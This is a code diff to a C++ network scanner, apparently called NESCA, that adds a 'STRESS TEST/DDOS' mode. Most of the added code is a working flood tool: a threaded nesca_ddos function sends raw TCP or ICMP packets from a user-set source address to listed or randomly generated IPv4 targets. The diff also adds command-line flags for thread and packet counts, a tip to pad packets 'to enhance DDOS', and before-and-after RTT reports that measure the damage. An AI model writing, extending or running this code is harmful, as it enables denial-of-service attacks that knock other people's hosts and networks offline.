@@ -31,6 +31,7 @@
 #include <cstdio>
 #include <cstdlib>
 #include <cstring>
+#include <netinet/in.h>
 #include <stdlib.h>
 #include <string>
 #include <unistd.h>
@@ -71,8 +72,8 @@ int main(int argc, char** argv)
     tf = set_flags(argp.type);
   else
     tf = str_set_flags(argp.custom_res_tcpflags);
-
   argp.tcpflags = set_tcp_flags(&tf);
+
   if (argp.custom_tcpflags){
     np.golder_rod_on();
     printf("-> syn: %d, ack: %d, rst: %d, fin: %d, psh: %d, urg: %d, cwr: %d, ece: %d\n",
@@ -88,6 +89,46 @@ int main(int argc, char** argv)
     np.golder_rod_on();
     puts("-> NOTE: Usually packages that have a payload greater than 1400 are rejected.");
     reset_colors;
+  }
+  if ((argp.tcp_ddos || argp.icmp_ddos) && argp.data_string.empty()) {
+    np.golder_rod_on();
+    puts("-> NOTE: To enhance DDOS you need to use (-data-len) to add payload.");
+    reset_colors;
+  }
+
+  /*Определение цели.*/
+  if (optind < argc) {
+    std::vector<std::string> temp_ips;
+    temp_ips = split_string_string(argv[optind], ',');
+    resolv_hosts(temp_ips);
+  }
+  if (argp.random_ip) {
+    int i;
+    for (i = 1; i <= argp.random_ip_count; i++) {
+      std::string random_temp = generate_ipv4();
+      n.add_ip(random_temp);
+    }
+  }
+
+  std::vector<std::string> temp_vector = n.get_all_ips();
+
+  if (temp_vector.size() > 50000 && argp.speed_type != 5) {
+    np.golder_rod_on();
+    std::cout << "-> NOTE: With your number of IPs - (" << temp_vector.size()
+      << "), it is better to use speed (-S5), otherwise scanning may take longer.\n";
+    reset_colors;
+  }
+
+  /*Расчёт количества потоков и таймаута для пинга.*/
+  if (!argp.custom_threads) {
+    if (argp.my_life_my_rulez) {
+      argp.threads_ping = temp_vector.size();
+      argp.ping_timeout = 250;
+    }
+    else {
+      argp.threads_ping = calculate_threads(argp.speed_type, temp_vector.size());
+      argp.ping_timeout = calculate_ping_timeout(argp.speed_type);
+    }
   }
 
   /*Установка методов пинга.*/
@@ -125,44 +166,6 @@ int main(int argc, char** argv)
         argp.timestamp_ping = true;
         break;
       }
-    }
-  }
-
-  /*Иницилизация брутфорса.*/
-  init_bruteforce();
-
-  /*Определение цели.*/
-  if (optind < argc) {
-    std::vector<std::string> temp_ips;
-    temp_ips = split_string_string(argv[optind], ',');
-    resolv_hosts(temp_ips);
-  }
-  if (argp.random_ip) {
-    int i;
-    for (i = 1; i <= argp.random_ip_count; i++) {
-      std::string random_temp = generate_ipv4();
-      n.add_ip(random_temp);
-    }
-  }
-
-  std::vector<std::string> temp_vector = n.get_all_ips();
-
-  if (temp_vector.size() > 50000 && argp.speed_type != 5){
-    np.golder_rod_on();
-    std::cout << "-> NOTE: With your number of IPs - (" << temp_vector.size() 
-      << "), it is better to use speed (-S5), otherwise scanning may take longer.\n";
-    reset_colors;
-  }
-
-  /*Расчёт количества потоков и таймаута для пинга.*/
-  if (!argp.custom_threads) {
-    if (argp.my_life_my_rulez) {
-      argp.threads_ping = temp_vector.size();
-      argp.ping_timeout = 250;
-    }
-    else {
-      argp.threads_ping = calculate_threads(argp.speed_type, temp_vector.size());
-      argp.ping_timeout = calculate_ping_timeout(argp.speed_type);
     }
   }
 
@@ -271,6 +274,82 @@ int main(int argc, char** argv)
     nescaend(count_success_ips, argp.ping_duration+argp.dns_duration);
     return 0;
   }
+
+  if (argp.icmp_ddos || argp.tcp_ddos) {
+
+    u32 saddr, daddr;
+    saddr = inet_addr(argp.source_ip);
+    u8 proto;
+    u16 port;
+
+    if (argp.icmp_ddos) {
+      proto = IPPROTO_ICMP;
+      port = 0;
+    }
+    else if (argp.tcp_ddos) {
+      proto = IPPROTO_TCP;
+      port = argp.ports[0];
+    }
+
+    std::vector<std::future<void>> futures_ddos;
+    thread_pool ddos_pool(argp.ddos_threads);
+
+    int ipc = 0;
+    double temprtt;
+    int totalsuccess = 0;;
+    auto start_time_ddos = std::chrono::high_resolution_clock::now();
+    for (const auto& ip : temp_vector) {
+      double newrtt;
+      temprtt = 0;
+      totalsuccess += argp.success_packet_ddos;
+      argp.success_packet_ddos = 0;
+      ipc++;
+      if (ipc > 1)
+        putchar('\n');
+
+      temprtt = n.get_rtt(ip);
+      std::cout << np.main_nesca_out("RUN", ip, 5, "rDNS", "RTT", n.get_new_dns(ip), std::to_string(temprtt)+"ms","") << std::endl;
+      daddr = inet_addr(ip.c_str());
+
+      for (int i = 1; i <= argp.ddos_packets; i++){
+        futures_ddos.emplace_back(ddos_pool.enqueue(nesca_ddos, proto, 8, daddr, saddr, port));
+
+        if (futures_ddos.size() >= static_cast<long unsigned int>(argp.ddos_threads)) {
+          for (auto& future : futures_ddos)
+            future.get();
+
+          futures_ddos.clear();
+        }
+
+        if (i % (argp.ddos_packets / 5) == 0) {
+          std::cout << np.main_nesca_out("REPORT", ip, 3, "packets", "out of",
+              std::to_string(argp.success_packet_ddos), std::to_string(argp.ddos_packets),"") << std::endl;
+        }
+      }
+      newrtt = icmp_ping(ip.c_str(), argp.source_ip, argp.ping_timeout, ICMP_ECHO, 0, 1, 64, NULL, 0, argp.frag_mtu);
+
+      std::cout << np.main_nesca_out("END", ip, 5, "Difference", "RTT",
+          std::to_string(newrtt - temprtt)+"ms", std::to_string(newrtt)+"ms","") << std::endl;
+    }
+    for (auto& future : futures_ddos)
+      future.wait();
+
+    futures_ddos.clear();
+
+    auto end_time_ddos = std::chrono::high_resolution_clock::now();
+    auto duration_ddos = std::chrono::duration_cast<std::chrono::microseconds>(end_time_ddos - start_time_ddos);
+    putchar('\n');
+
+    np.golder_rod_on();
+    std::cout << "-> NESCA finished " << totalsuccess << " packets (success) in "
+      << std::fixed << std::setprecision(2) << duration_ddos.count() / 1000000.0 << " seconds\n";
+    reset_colors;
+
+    return 0;
+  }
+
+  /*Иницилизация брутфорса.*/
+  init_bruteforce();
 
   n.group_size = GROUP_MIN_SIZE_DEFAULT;
 
@@ -588,6 +667,56 @@ ok:
   return 1;
 }
 
+void nesca_ddos(u8 proto, u8 type, const u32 daddr, const u32 saddr, const int port)
+{
+  u32 seq, datalen = 0;
+  int source_port, res, sock;
+  u16 ttl;
+  const char* data;
+  bool df = true;
+
+  if (argp.frag_mtu)
+    df = false;
+
+  seq = generate_seq();
+
+  if (proto == IPPROTO_TCP) {
+    if (argp.custom_source_port)
+      source_port = argp._custom_source_port;
+    else
+      source_port = generate_rare_port();
+  }
+
+  if (!argp.data_string.empty()) {
+    data = argp.data_string.c_str();
+    datalen = strlen(data);
+  }
+
+  if (argp.custom_ttl)
+    ttl = argp._custom_ttl;
+  else
+    ttl = random_num(29, 255);
+
+  sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+  if (sock == -1)
+    return;
+
+  if (proto == IPPROTO_TCP)
+    res = send_tcp_packet(sock, saddr, daddr, ttl, df, 0, 0, source_port, port, seq, 0, 0, argp.tcpflags, 1024,
+        0, 0, 0, data, datalen, argp.frag_mtu);
+  else if (proto == IPPROTO_ICMP)
+    res = send_icmp_packet(sock, saddr, daddr, ttl, df, 0, 0, seq, 0, type, data, datalen, argp.frag_mtu);
+
+  ls.lock();
+  close(sock);
+  ls.unlock();
+
+  if (res != -1) {
+    ls.lock();
+    argp.success_packet_ddos++;
+    ls.unlock();
+  }
+}
 
 void process_port(const std::string& ip, std::vector<uint16_t> ports, int port_type)
 {
@@ -839,6 +968,12 @@ void usage(void)
   std::cout << "  -data-len <num>: Append random data to sent packets.\n";
   std::cout << "  -frag <mtu>: fragment all packets.\n";
   std::cout << "  -ttl <num>: Set custom ip_header_ttl.\n";
+  np.golder_rod_on();
+  std::cout << "STRESS TEST/DDOS:" << std::endl;
+  reset_colors;
+  std::cout << "  -TDD: Set max thread(s) for DDOS.\n";
+  std::cout << "  -tcp-ddos, -icmp-ddos: Set a protocol for ddos, and enable ddos mode.\n";
+  std::cout << "  -ddos-len: Set the number of packages for the host.\n";
   np.golder_rod_on();
   std::cout << "PORT SCAN GROUPS:" << std::endl;
   reset_colors;
@@ -1293,6 +1428,12 @@ void parse_args(int argc, char** argv)
         argp.ip_scan_import = true;
         argp.path_ips = optarg;
         break;
+      case 15:
+        argp.tcp_ddos = true;
+        break;
+      case 16:
+        argp.icmp_ddos = true;
+        break;
       case 24:
         argp.custom_log_set = true;
         argp.log_set = atoi(optarg);
@@ -1400,6 +1541,9 @@ void parse_args(int argc, char** argv)
         argp.my_life_my_rulez = true;
         argp.speed_type = 5;
         break;
+      case 10:
+        argp.ddos_packets = atoi(optarg);
+        break;
       case 78:
         np.import_color_scheme(optarg, np.config_values);
         np.processing_color_scheme(np.config_values);
@@ -1456,6 +1600,9 @@ void parse_args(int argc, char** argv)
       case 89:
         argp.ack_scan = true;
         argp.type = ACK_SCAN;
+        break;
+      case 9:
+        argp.ddos_threads = atoi(optarg);
         break;
       case 90:
         argp.ping_log = atoi(optarg);
